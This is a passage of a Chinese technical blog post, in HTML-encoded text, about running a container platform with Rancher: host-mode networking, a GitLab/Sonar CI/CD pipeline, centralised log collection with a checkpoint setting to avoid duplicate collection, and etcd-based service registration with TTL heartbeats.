<p> &#x56FE;5: Rancher&#x67B6;&#x6784;&#x56FE;<br> &#x57FA;&#x4E8E;&#x4EE5;&#x4E0A;&#x4F18;&#x70B9;&#x6211;&#x4EEC;&#x9009;&#x62E9;Rancher&#x4F5C;&#x4E3A;&#x6211;&#x4EEC;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;&#x7684;&#x7F16;&#x6392;&#x5DE5;&#x5177;&#xFF0C;&#x5728;&#x5BF9;&#x5E94;&#x7528;&#x7684;&#x5BB9;&#x5668;&#x5B9E;&#x4F8B;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x7684;&#x7F16;&#x6392;&#x8C03;&#x5EA6;&#x65F6;&#xFF0C;&#x914D;&#x5408;Docker-Compose&#x7EC4;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x5BF9;&#x591A;&#x53F0;&#x5BBF;&#x4E3B;&#x673A;&#x6267;&#x884C;&#x8C03;&#x5EA6;&#x64CD;&#x4F5C;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x8BBF;&#x95EE;&#x51FA;&#x73B0;&#x5CF0;&#x503C;&#x548C;&#x4F4E;&#x8C37;&#x65F6;&#xFF0C;&#x5229;&#x7528;&#x7279;&#x6709;&#x7684;rancher-compose.yml&#x6587;&#x4EF6;&#x8C03;&#x7528;&#x201C;SCALE&#x201D;&#x7279;&#x6027;&#xFF0C;&#x5BF9;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x6267;&#x884C;&#x52A8;&#x6001;&#x6269;&#x5BB9;&#x548C;&#x7F29;&#x5BB9;&#xFF0C;&#x8BA9;&#x5E94;&#x7528;&#x6309;&#x9700;&#x6C42;&#x5904;&#x7406;&#x4E0D;&#x540C;&#x7684;&#x8BF7;&#x6C42;&#x3002;https:/zhuanlan.zhihu.com/p/29093407</p>
<h3 id="&#x5BB9;&#x5668;&#x7F51;&#x7EDC;&#x6A21;&#x578B;&#x9009;&#x578B;&#xFF1A;"><a href="#&#x5BB9;&#x5668;&#x7F51;&#x7EDC;&#x6A21;&#x578B;&#x9009;&#x578B;&#xFF1A;" class="headerlink" title="&#x5BB9;&#x5668;&#x7F51;&#x7EDC;&#x6A21;&#x578B;&#x9009;&#x578B;&#xFF1A;"></a><strong>&#x5BB9;&#x5668;&#x7F51;&#x7EDC;&#x6A21;&#x578B;&#x9009;&#x578B;&#xFF1A;</strong></h3><p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/ed3930e86554ce6d0e02a7b551aa61e50029bacda7480244f6f74d7c50e4bc9d" alt></p>
<p> &#x56FE;6: &#x5BB9;&#x5668;&#x7F51;&#x7EDC;&#x6A21;&#x578B;&#x9009;&#x578B;<br> &#x7531;&#x4E8E;&#x540E;&#x7AEF;&#x5F00;&#x53D1;&#x57FA;&#x4E8E;&#x963F;&#x91CC;&#x7684;HSF&#x6846;&#x67B6;&#xFF0C;&#x751F;&#x4EA7;&#x8005;&#x548C;&#x6D88;&#x8D39;&#x8005;&#x4E4B;&#x95F4;&#x9700;&#x8981;&#x7F51;&#x7EDC;&#x53EF;&#x8FBE;&#xFF0C;&#x5BF9;&#x7F51;&#x7EDC;&#x8981;&#x6C42;&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x9700;&#x8981;&#x4EE5;&#x771F;&#x5B9E;IP&#x5730;&#x5740;&#x8FDB;&#x884C;&#x6CE8;&#x518C;&#x548C;&#x62C9;&#x53D6;&#x670D;&#x52A1;&#x3002;&#x6240;&#x4EE5;&#x5728;&#x9009;&#x62E9;&#x5BB9;&#x5668;&#x7F51;&#x7EDC;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x4E86;Host&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F1A;&#x6267;&#x884C;&#x811A;&#x672C;&#x68C0;&#x67E5;&#x5BBF;&#x4E3B;&#x673A;&#x5E76;&#x5206;&#x914D;&#x7ED9;&#x5BB9;&#x5668;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x6765;&#x907F;&#x514D;&#x51B2;&#x7A81;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<h2 id="&#x6301;&#x7EED;&#x96C6;&#x6210;&#x4E0E;&#x6301;&#x7EED;&#x90E8;&#x7F72;"><a href="#&#x6301;&#x7EED;&#x96C6;&#x6210;&#x4E0E;&#x6301;&#x7EED;&#x90E8;&#x7F72;" class="headerlink" title="&#x6301;&#x7EED;&#x96C6;&#x6210;&#x4E0E;&#x6301;&#x7EED;&#x90E8;&#x7F72;"></a><strong>&#x6301;&#x7EED;&#x96C6;&#x6210;&#x4E0E;&#x6301;&#x7EED;&#x90E8;&#x7F72;</strong></h2><ul>
<li>&#x6301;&#x7EED;&#x96C6;&#x6210;&#xFF0C; &#x76D1;&#x6D4B;&#x4EE3;&#x7801;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#xFF0C;&#x5BF9;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6301;&#x7EED;&#x96C6;&#x6210;&#xFF0C;&#x5728;&#x96C6;&#x6210;&#x8FC7;&#x7A0B;&#x4E2D;&#x6267;&#x884C;&#x5355;&#x5143;&#x6D4B;&#x8BD5;&#xFF0C;&#x4EE3;&#x7801;Sonar&#x548C;&#x5B89;&#x5168;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x9759;&#x6001;&#x626B;&#x63CF;&#xFF0C;&#x5C06;&#x7ED3;&#x679C;&#x901A;&#x77E5;&#x7ED9;&#x5F00;&#x53D1;&#x540C;&#x5B66;&#x540C;&#x65F6;&#x90E8;&#x7F72;&#x96C6;&#x6210;&#x73AF;&#x5883;&#xFF0C;&#x90E8;&#x7F72;&#x6210;&#x529F;&#x540E;&#x89E6;&#x53D1;&#x81EA;&#x52A8;&#x5316;&#x6D4B;&#x8BD5;&#xFF08;&#x81EA;&#x52A8;&#x5316;&#x6D4B;&#x8BD5;&#x90E8;&#x5206;&#x540E;&#x7EED;&#x4F1A;&#x66F4;&#x65B0;<a href="/external_links/707c5263f7c05f511ede902b78de5a45.html" target="blank" rel="noopener">https://zhuanlan.zhihu.com/idevops</a> &#xFF09;&#x3002; <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/baf982d1530aee1480bc1f4d3572db37a9d6156f189adc03c1cb2d62b1cf7d71" alt></li>
</ul>
<p> &#x56FE;7:&#x6301;&#x7EED;&#x96C6;&#x6210;&#x793A;&#x610F;&#x56FE;</p>
<p>&#x9759;&#x6001;&#x626B;&#x63CF;&#x7ED3;&#x679C;&#xFF1A; <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/43b512ffca855646e4914acc9fb56f296e503fc15ec08a7a3e23f11f10ebaf9b" alt></p>
<p> &#x56FE;8: &#x6301;&#x7EED;&#x96C6;&#x6210;&#x7ED3;&#x679C;&#x793A;&#x610F;&#x56FE;</p>
<ul>
<li>&#x6301;&#x7EED;&#x90E8;&#x7F72;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x80FD;&#x529B;&#xFF0C;&#x8FD9;&#x79CD;&#x80FD;&#x529B;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x628A;&#x4E00;&#x4E2A;&#x5305;&#x5FEB;&#x901F;&#x90E8;&#x7F72;&#x5728;&#x4F60;&#x60F3;&#x8981;&#x7684;&#x5730;&#x65B9;&#x3002;&#x5E73;&#x53F0;&#x91C7;&#x7528;&#x5206;&#x5E03;&#x5F0F;&#x6784;&#x5EFA;&#x3001;&#x90E8;&#x7F72;&#xFF0C;master&#x7BA1;&#x7406;&#x591A;&#x4E2A;slave&#x8282;&#x70B9;&#xFF0C;&#x6BCF;&#x4E2A;slave&#x8282;&#x70B9;&#x5206;&#x5C5E;&#x4E0D;&#x540C;&#x7684;&#x73AF;&#x5883;&#x3002;&#x5728;master&#x4E0A;&#x5B89;&#x88C5;&#x5E76;&#x66F4;&#x65B0;&#x63D2;&#x4EF6;&#x3001;&#x521B;&#x5EFA;job&#x3001;&#x7BA1;&#x7406;&#x5404;&#x5F00;&#x53D1;&#x56E2;&#x961F;&#x6743;&#x9650;&#x3002;slave&#x7528;&#x4E8E;&#x6267;&#x884C;job&#x3002;  <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/fbea448a1a3bfaef07bdecdddbc799f8f0d87222dd1a624774a71807fc3b1ca0" alt></li>
</ul>
<p> &#x56FE;9: &#x6301;&#x7EED;&#x90E8;&#x7F72;&#x67B6;&#x6784;&#x56FE;</p>
<p>&#x57FA;&#x4E8E;&#x4E0A;&#x8FF0;&#x56FE;9&#x67B6;&#x6784;&#xFF0C;&#x6211;&#x4EEC;&#x5B9A;&#x4E49;&#x4E86;&#x6301;&#x7EED;&#x90E8;&#x7F72;&#x89C4;&#x8303;&#x7684;&#x6D41;&#x7A0B;&#xFF1A;</p>
<p>&#xFF08;1&#xFF09;&#x5F00;&#x53D1;&#x540C;&#x5B66;&#x5411;gitlab&#x63D0;&#x4EA4;&#x4EE3;&#x7801;&#xFF1B; &#xFF08;2&#xFF09;&#x62C9;&#x53D6;&#x9879;&#x76EE;&#x4EE3;&#x7801;&#x548C;&#x914D;&#x7F6E;&#x9879;&#x6587;&#x4EF6;&#xFF0C;&#x6267;&#x884C;&#x7F16;&#x8BD1;&#x4EFB;&#x52A1;&#xFF1B; &#xFF08;3&#xFF09;&#x62C9;&#x53D6;&#x57FA;&#x7840;&#x955C;&#x50CF;&#xFF0C;&#x5C06;&#x7F16;&#x8BD1;&#x597D;&#x7684;&#x5E94;&#x7528;&#x5305;&#x6253;&#x5165;&#x751F;&#x6210;&#x6700;&#x65B0;&#x7684;&#x5E94;&#x7528;&#x955C;&#x50CF;&#xFF0C;&#x63A8;&#x9001;&#x5230;&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#xFF1B; &#xFF08;4&#xFF09;&#x6839;&#x636E;&#x5F53;&#x524D;&#x5E94;&#x7528;&#x53CA;&#x6240;&#x5C5E;&#x73AF;&#x5883;&#x5B9A;&#x5236;&#x5316;&#x751F;&#x6210;docker-compose.yml&#x6587;&#x4EF6;&#xFF0C;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6267;&#x884C;rancher-compose&#x547D;&#x4EE4;&#xFF0C;&#x5C06;&#x5E94;&#x7528;&#x955C;&#x50CF;&#x90E8;&#x7F72;&#x5230;&#x9884;&#x53D1;&#x73AF;&#x5883;&#xFF08;&#x53D1;&#x5E03;&#x751F;&#x4EA7;&#x524D;&#x7684;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#xFF0C;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x3001;&#x670D;&#x52A1;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x548C;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E00;&#x81F4;&#xFF09;&#x3002; &#xFF08;6&#xFF09;&#x9884;&#x53D1;&#x73AF;&#x5883;&#x6D4B;&#x8BD5;&#x901A;&#x8FC7;&#x540E;&#x5C06;&#x5E94;&#x7528;&#x955C;&#x50CF;&#x90E8;&#x7F72;&#x81F3;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#xFF0C;&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#x901A;&#x77E5;&#x540E;&#x7AEF;&#x6D4B;&#x8BD5;&#x540C;&#x5B66;&#x3002;</p>
<h2 id="&#x5BB9;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x7BA1;&#x7406;"><a href="#&#x5BB9;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x7BA1;&#x7406;" class="headerlink" title="&#x5BB9;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x7BA1;&#x7406;"></a><strong>&#x5BB9;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x7BA1;&#x7406;</strong></h2><p>&#x5E94;&#x7528;&#x5BB9;&#x5668;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x90E8;&#x7F72;&#x5230;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x6574;&#x4E2A;&#x5BB9;&#x5668;&#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x4E2D;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x89E3;&#x51B3;&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;</p>
<p>&#xFF08;1&#xFF09; &#x5982;&#x4F55;&#x4FDD;&#x5B58;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4EA7;&#x751F;&#x7684;&#x8FD0;&#x884C;&#x65E5;&#x5FD7;&#x548C;&#x5176;&#x5B83;&#x4E1A;&#x52A1;&#x65E5;&#x5FD7;&#xFF1B; &#xFF08;2&#xFF09; &#x5982;&#x4F55;&#x5728;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x51FA;&#x73B0;&#x53D8;&#x5316;&#x540E;nginx&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#x5E76;&#x5B8C;&#x6210;&#x914D;&#x7F6E;&#x66F4;&#x65B0;&#x3002;</p>
<h2 id="&#x65E5;&#x5FD7;&#x7BA1;&#x7406;"><a href="#&#x65E5;&#x5FD7;&#x7BA1;&#x7406;" class="headerlink" title="&#x65E5;&#x5FD7;&#x7BA1;&#x7406;"></a><strong>&#x65E5;&#x5FD7;&#x7BA1;&#x7406;</strong></h2><p>&#x5BB9;&#x5668;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x4F1A;&#x5728;&#x53EA;&#x8BFB;&#x5C42;&#x4E4B;&#x4E0A;&#x521B;&#x5EFA;&#x8BFB;&#x5199;&#x5C42;&#xFF0C;&#x6240;&#x6709;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x5728;&#x8FD9;&#x5C42;&#x8FDB;&#x884C;&#x3002;&#x5F53;&#x5BB9;&#x5668;&#x91CD;&#x542F;&#x540E;&#xFF0C;&#x8BFB;&#x5199;&#x5C42;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF08;&#x5305;&#x542B;&#x65E5;&#x5FD7;&#xFF09;&#x4E5F;&#x4F1A;&#x4E00;&#x5E76;&#x88AB;&#x6E05;&#x9664;&#x3002;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;&#x5BB9;&#x5668;&#x4E2D;&#x65E5;&#x5FD7;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x89E3;&#x51B3;&#x6B64;&#x7C7B;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x5F53;&#x5BB9;&#x5668;&#x5728;&#x591A;&#x4E2A;&#x5BBF;&#x4E3B;&#x673A;&#x95F4;&#x9891;&#x7E41;&#x6F02;&#x79FB;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A;&#x5BBF;&#x4E3B;&#x673A;&#x4E0A;&#x90FD;&#x4F1A;&#x6709;&#x7559;&#x5B58;&#x5E94;&#x7528;&#x540D;&#x7684;&#x90E8;&#x5206;&#x65E5;&#x5FD7;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x5F00;&#x53D1;&#x540C;&#x5B66;&#x67E5;&#x770B;&#x3001;&#x6392;&#x67E5;&#x95EE;&#x9898;&#x7684;&#x96BE;&#x5EA6;&#x3002;</p>
<p>&#x7EFC;&#x4E0A;&#x6240;&#x5C5E;&#xFF0C;&#x65E5;&#x5FD7;&#x670D;&#x52A1;&#x5E73;&#x53F0;&#x4F5C;&#x4E3A;&#x4E94;&#x963F;&#x54E5;&#x7F51;&#x7AD9;&#x65E5;&#x5FD7;&#x4ED3;&#x5E93;&#xFF0C;&#x5C06;&#x5E94;&#x7528;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x4EA7;&#x751F;&#x7684;&#x65E5;&#x5FD7;&#x7EDF;&#x4E00;&#x5B58;&#x50A8;&#xFF0C;&#x5E76;&#x4E14;&#x652F;&#x6301;&#x591A;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x3002; <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/3a4033d94f679aa86caa9038cb84f4e098a380b093ae3198f439214fb222e954" alt></p>
<p> &#x56FE;10:&#x65E5;&#x5FD7;&#x670D;&#x52A1;&#x5E73;&#x53F0;<br> &#x901A;&#x8FC7;&#x5728;&#x65E5;&#x5FD7;&#x670D;&#x52A1;&#x7684;&#x7BA1;&#x7406;&#x754C;&#x9762;&#x914D;&#x7F6E;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x8DEF;&#x5F84;&#xFF0C;&#x5728;&#x5BB9;&#x5668;&#x4E2D;&#x90E8;&#x7F72;agent&#x628A;&#x5E94;&#x7528;&#x65E5;&#x5FD7;&#x7EDF;&#x4E00;&#x6295;&#x9012;&#x5230;logstore&#x4E2D;&#xFF0C;&#x518D;&#x5728;logstore&#x4E2D;&#x914D;&#x7F6E;&#x5168;&#x6587;&#x7D22;&#x5F15;&#x548C;&#x5206;&#x8BCD;&#x7B26;&#xFF0C;&#x4EE5;&#x4FBF;&#x5F00;&#x53D1;&#x540C;&#x5B66;&#x80FD;&#x591F;&#x901A;&#x8FC7;&#x5173;&#x952E;&#x5B57;&#x641C;&#x7D22;&#x3001;&#x67E5;&#x8BE2;&#x60F3;&#x8981;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;&#xFF1A;&#x5982;&#x4F55;&#x907F;&#x514D;&#x65E5;&#x5FD7;&#x7684;&#x91CD;&#x590D;&#x91C7;&#x96C6;&#x95EE;&#x9898;&#xFF1F;</p>
<ul>
<li>&#x65E5;&#x5FD7;&#x670D;&#x52A1;agent&#x9700;&#x8981;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x201C;ilogtail_config.json&#x201D;&#x4E2D;&#x589E;&#x52A0;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x201C;check_point_filename&#x201D;&#xFF0C;&#x6307;&#x5B9A;checkpoint&#x6587;&#x4EF6;&#x751F;&#x6210;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x4E14;&#x5C06;&#x6B64;&#x8DEF;&#x5F84;&#x6302;&#x8F7D;&#x81F3;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x786E;&#x4FDD;&#x5BB9;&#x5668;&#x5728;&#x91CD;&#x542F;&#x65F6;&#x4E0D;&#x4F1A;&#x4E22;&#x5931;checkpoint&#x6587;&#x4EF6;&#xFF0C;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x91CD;&#x590D;&#x91C7;&#x96C6;&#x95EE;&#x9898;&#x3002;</li>
</ul>
<h2 id="&#x670D;&#x52A1;&#x7684;&#x6CE8;&#x518C;"><a href="#&#x670D;&#x52A1;&#x7684;&#x6CE8;&#x518C;" class="headerlink" title="&#x670D;&#x52A1;&#x7684;&#x6CE8;&#x518C;"></a><strong>&#x670D;&#x52A1;&#x7684;&#x6CE8;&#x518C;</strong></h2><p>etcd&#x662F;&#x4E00;&#x4E2A;&#x5177;&#x5907;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x548C;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x952E;&#x503C;&#x5B58;&#x50A8;&#x4ED3;&#x5E93;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x7C7B;&#x4F3C;&#x4E8E;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x6811;&#x5F62;&#x7ED3;&#x6784;&#xFF0C;&#x6570;&#x636E;&#x5168;&#x90E8;&#x4EE5;&#x201C;/&#x201D;&#x5F00;&#x5934;&#x3002;etcd&#x7684;&#x6570;&#x636E;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x7C7B;&#x578B;&#xFF1A;key&#x548C;directories&#xFF0C;&#x5176;&#x4E2D;key&#x4E0B;&#x5B58;&#x50A8;&#x5355;&#x72EC;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x503C;&#xFF0C;directories&#x4E0B;&#x5219;&#x5B58;&#x653E;key&#x7684;&#x96C6;&#x5408;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x5B50;&#x76EE;&#x5F55;&#x3002;</p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/3a4033d94f679aa86caa9038cb84f4e098a380b093ae3198f439214fb222e954" alt> </p>
<p> &#x56FE;11 &#x5E94;&#x7528;&#x6CE8;&#x518C;<br> &#x5728;&#x4E94;&#x963F;&#x54E5;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E2A;&#x5411;etcd&#x6CE8;&#x518C;&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x90FD;&#x4EE5;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&#x201D;/${APP_NAME}_${ENVIRONMENT}&#x201D;</span><br></pre></td></tr></table></figure>

<p>&#x547D;&#x540D;&#x3002;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x50A8;&#x6BCF;&#x4E2A;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x7684;Key&#x4FE1;&#x606F;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x4EE5;&#x201C;<br> IP &#x2212; {PORT}&#x201D;&#x7684;&#x65B9;&#x5F0F;&#x547D;&#x540D;&#x3002; </p>
<p>&#x4E0B;&#x56FE;&#x662F;&#x4F7F;&#x7528;&#x4E0A;&#x8FF0;&#x7EA6;&#x5B9A;&#xFF0C;&#x5B58;&#x50A8;&#x5728;etcd&#x4E0A;&#x67D0;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF1A;</p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/67a4097468352ed2c1c615cbe75505e6813a4bd91814ea03a8ee4cf70eb4180d" alt> </p>
<p> &#x56FE;12: &#x5B58;&#x50A8;&#x5728;etcd&#x4E0A;&#x67D0;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;<br> &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x662F;&#x4F7F;&#x7528;get&#x65B9;&#x6CD5;&#x5411;etcd&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x7684;&#xFF0C;&#x8BF7;&#x6C42;&#x7684;&#x662F;&#x90E8;&#x7F72;&#x5728;&#x9884;&#x53D1;&#x73AF;&#x5883;&#xFF08;PRE&#xFF09;&#x7684;&#x641C;&#x7D22;&#x670D;&#x52A1;&#xFF08;search&#xFF09;&#xFF1B;&#x5728;&#x5B83;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x201C;/search_PRE&#x201D;&#x4E0B;&#xFF0C;&#x4EC5;&#x5B58;&#x50A8;&#x4E86;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x8FD9;&#x4E2A;&#x5B9E;&#x4F8B;&#x7684;key&#x662F;&#x201C;172.18.100.31-86&#x201D;&#xFF1B;&#x5BF9;&#x5E94;&#x7684;value&#x662F;&#x201C;172.18.100.31:86&#x2018;&#x2019;&#xFF0C;&#x6574;&#x4E2A;&#x6CE8;&#x518C;&#x8FC7;&#x7A0B;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>
<blockquote>
<p>&#x2460; &#x901A;&#x8FC7;&#x4EE3;&#x7801;&#x4E3A;&#x5BB9;&#x5668;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x751F;&#x6210;&#x968F;&#x673A;&#x7AEF;&#x53E3;&#xFF0C;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x7AEF;&#x53E3;&#x8FDB;&#x884C;&#x6BD4;&#x5BF9;&#xFF0C;&#x786E;&#x4FDD;&#x7AEF;&#x53E3;&#x6CA1;&#x6709;&#x51B2;&#x7A81;&#x540E;&#x5199;&#x5165;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1B; &#x2461; &#x628A;&#x901A;&#x8FC7;python&#x548C;etcd&#x6A21;&#x5757;&#x7F16;&#x5199;&#x7684;&#x670D;&#x52A1;&#x6CE8;&#x518C;&#x5DE5;&#x5177;&#x96C6;&#x6210;&#x5728;&#x811A;&#x672C;&#x4E2D;&#xFF0C;&#x5C06;IP&#x5730;&#x5740;&#x548C;&#x4E0A;&#x4E00;&#x6B65;&#x83B7;&#x53D6;&#x7684;&#x968F;&#x673A;&#x7AEF;&#x53E3;&#x4EE5;&#x53C2;&#x6570;&#x7684;&#x65B9;&#x5F0F;&#x4F20;&#x9012;&#x7ED9;&#x670D;&#x52A1;&#x6CE8;&#x518C;&#x5DE5;&#x5177;&#xFF1B; &#x2462; &#x5F85;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5B8C;&#x5168;&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x7531;&#x670D;&#x52A1;&#x6CE8;&#x518C;&#x5DE5;&#x5177;&#x4EE5;&#x7EA6;&#x5B9A;&#x597D;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5C06;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x5199;&#x5165;etcd&#x96C6;&#x7FA4;&#xFF0C;&#x5B8C;&#x6210;&#x670D;&#x52A1;&#x6CE8;&#x518C;&#x5DE5;&#x4F5C;&#xFF1B; &#x2463; &#x5BB9;&#x5668;&#x5B9A;&#x65F6;&#x5411;etcd&#x53D1;&#x9001;&#x5FC3;&#x8DF3;&#xFF0C;&#x62A5;&#x544A;&#x5B58;&#x6D3B;&#x5E76;&#x5237;&#x65B0;ttl&#x65F6;&#x95F4;&#xFF1B; &#x2464; &#x5BB9;&#x5668;&#x811A;&#x672C;&#x6355;&#x83B7;rancher&#x53D1;&#x9001;&#x81F3;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#x7684;singnal<br> terminal&#x4FE1;&#x53F7;&#xFF0C;&#x5728;&#x63A5;&#x6536;&#x5230;&#x4FE1;&#x53F7;&#x540E;&#x5411;etcd&#x53D1;&#x9001;delete&#x8BF7;&#x6C42;&#x5220;&#x9664;&#x5B9E;&#x4F8B;&#x7684;&#x6570;&#x636E;&#x3002;</p>
</blockquote>
<p>&#x6CE8;&#xFF1A;&#x5728;ttl&#x57FA;&#x7840;&#x4E0A;&#x589E;&#x52A0;&#x4E3B;&#x52A8;&#x6E05;&#x9664;&#x529F;&#x80FD;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x6B63;&#x5E38;&#x91CA;&#x653E;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x7ACB;&#x523B;&#x6E05;&#x9664;etcd&#x4E0A;&#x6CE8;&#x518C;&#x4FE1;&#x606F;&#xFF0C;&#x4E0D;&#x5FC5;&#x7B49;&#x5F85;ttl&#x65F6;&#x95F4;&#x3002;</p>
<p>&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;&#xFF1A;&#x5BB9;&#x5668;&#x5728;&#x91CD;&#x542F;&#x6216;&#x8005;&#x610F;&#x5916;&#x9500;&#x6BC1;&#x65F6;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x4E00;&#x8D77;&#x770B;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x5BB9;&#x5668;&#x548C;&#x6CE8;&#x518C;&#x4E2D;&#x5FC3;&#x90FD;&#x505A;&#x4E86;&#x4EC0;&#x4E48;&#x4E8B;&#x60C5;&#xFF1F;</p>
<p>&#x5E94;&#x7528;&#x5728;&#x6CE8;&#x518C;&#x662F;&#x643A;&#x5E26;key 